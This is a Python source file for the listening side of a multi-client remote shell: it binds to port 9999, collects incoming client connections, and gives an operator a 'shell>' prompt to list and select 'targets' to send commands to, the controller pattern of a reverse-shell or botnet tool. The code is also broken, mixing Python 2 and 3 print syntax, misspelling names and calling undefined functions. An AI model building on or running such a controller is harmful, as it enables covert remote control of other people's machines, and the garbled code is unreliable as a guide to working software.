import socket
import sys
import threading
from multiprocessing import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

class CustomThread(threading.Thread):

    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name

    def run(self):
        main()
        print("Thread", self.name, "Excution Ends")
        thread.exit()

# create a socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print "Socket craetion error: " + str(msg)


#Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s

        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying....")
        socket_bind()

# accept connections from multple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: " + address[0])
        except:
            print("Error accepting connections")

def start_shell():
    while 1:
        cmd = input('shell> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commannds(conn)
        else:
            print("Command not recongnized")

def list_connections():
    results = ''
    for i, conn in emumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
        results += str(i) + " " + str(all_addresses[i][0]) + " " + str(all_address[i][1]) + "\n"
        print('----- Client ------' + '\n' + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', "")
        target = int(target)
        conn = all_connections[target]
        print("You are n ow connected to " + str(all_addreses[target][0]))
        print(str(all_addresses[target][0]) + '>\n')
        return conn
    except:
        print("Not a valid selection")
        return None


def main():
    socket_create()
    socket_bind()
    accept_connections()
